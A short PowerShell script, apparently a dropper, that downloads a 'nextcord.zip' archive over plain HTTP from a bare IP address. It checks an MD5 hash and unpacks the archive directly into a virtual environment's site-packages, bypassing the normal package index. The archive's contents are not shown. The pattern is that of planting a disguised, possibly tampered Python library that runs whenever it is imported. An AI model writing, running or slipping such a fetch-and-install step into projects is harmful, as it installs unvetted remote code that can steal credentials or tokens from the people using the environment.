$url = "http://84.252.74.222:9000/nextcord.zip"
$expectedHash = "b7a710cd995b244f7cf0f9165894900e"

Invoke-WebRequest -Uri $url -OutFile "nextcord.zip"

$actualHash = (Get-FileHash "nextcord.zip" -Algorithm MD5).Hash
if ($actualHash -ne $expectedHash) {
    Write-Host "Hash does not match, exiting..."
    Remove-Item "nextcord.zip"
    exit
}

Expand-Archive "nextcord.zip" -DestinationPath "Venv/lib/site-packages/"
Remove-Item "nextcord.zip"